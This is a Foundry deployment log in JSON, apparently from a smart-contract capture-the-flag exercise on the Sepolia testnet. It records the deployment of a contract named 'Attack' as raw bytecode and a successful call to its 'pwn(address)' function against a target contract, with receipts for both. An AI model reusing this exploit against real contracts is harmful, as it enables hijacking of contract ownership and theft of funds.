{
  "transactions": [
    {
      "hash": "0xc5acde590497096f034a314a12232c02524b69fb5068e4c38623f0ff2d92edf8",
      "transactionType": "CREATE",
      "contractName": "Attack",
      "contractAddress": "0xc6c64442eab5d71105c584481ef1f4c089447785",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "gas": "0x35682",
        "value": "0x0",
        "input": "0x6080604052348015600f57600080fd5b506102158061001f6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806302c6591d1461005c57806327d6974f146100715780633beb26c4146100a15780633dc79422146100b45780638da5cb5b146100c7575b600080fd5b61006f61006a366004610196565b6100de565b005b600154610084906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b61006f6100af3660046101c6565b600255565b600054610084906001600160a01b031681565b6100d060025481565b604051908152602001610098565b60405163078f013160e51b815230600482015281906001600160a01b0382169063f1e0262090602401600060405180830381600087803b15801561012157600080fd5b505af1158015610135573d6000803e3d6000fd5b505060405163078f013160e51b81523360048201526001600160a01b038416925063f1e026209150602401600060405180830381600087803b15801561017a57600080fd5b505af115801561018e573d6000803e3d6000fd5b505050505050565b6000602082840312156101a857600080fd5b81356001600160a01b03811681146101bf57600080fd5b9392505050565b6000602082840312156101d857600080fd5b503591905056fea264697066735822122082e3353c0e7897f63398b440f5e45c4e3dddec0c5a2d606ba47a4ecd94c9b87364736f6c63430008190033",
        "nonce": "0x9a",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": "0xc8436da8bc9160e706edcc2e95109c3164382830da8a9077e054e9805bb6b065",
      "transactionType": "CALL",
      "contractName": "Attack",
      "contractAddress": "0xc6c64442eab5d71105c584481ef1f4c089447785",
      "function": "pwn(address)",
      "arguments": [
        "0x7aDb56157A973022FDb182e564C9c6e3AdA12fBf"
      ],
      "transaction": {
        "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
        "to": "0xc6c64442eab5d71105c584481ef1f4c089447785",
        "gas": "0xe2be",
        "value": "0x0",
        "input": "0x02c6591d0000000000000000000000007adb56157a973022fdb182e564c9c6e3ada12fbf",
        "nonce": "0x9b",
        "chainId": "0xaa36a7"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x136b3a9",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xc5acde590497096f034a314a12232c02524b69fb5068e4c38623f0ff2d92edf8",
      "transactionIndex": "0x129",
      "blockHash": "0xcc00e6a391d6787722191e2582a7416004f9b2169d31086baf652126e529b51b",
      "blockNumber": "0x65a369",
      "gasUsed": "0x29175",
      "effectiveGasPrice": "0x122eb29533",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": null,
      "contractAddress": "0xc6c64442eab5d71105c584481ef1f4c089447785"
    },
    {
      "status": "0x1",
      "cumulativeGasUsed": "0x1374eb3",
      "logs": [],
      "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
      "type": "0x2",
      "transactionHash": "0xc8436da8bc9160e706edcc2e95109c3164382830da8a9077e054e9805bb6b065",
      "transactionIndex": "0x12a",
      "blockHash": "0xcc00e6a391d6787722191e2582a7416004f9b2169d31086baf652126e529b51b",
      "blockNumber": "0x65a369",
      "gasUsed": "0x9b0a",
      "effectiveGasPrice": "0x122eb29533",
      "from": "0x02a7abaaabe2053b49e7ca0a1a6eb33cea79299f",
      "to": "0xc6c64442eab5d71105c584481ef1f4c089447785",
      "contractAddress": null
    }
  ],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1725884414,
  "chain": 11155111,
  "commit": "b020e18"
}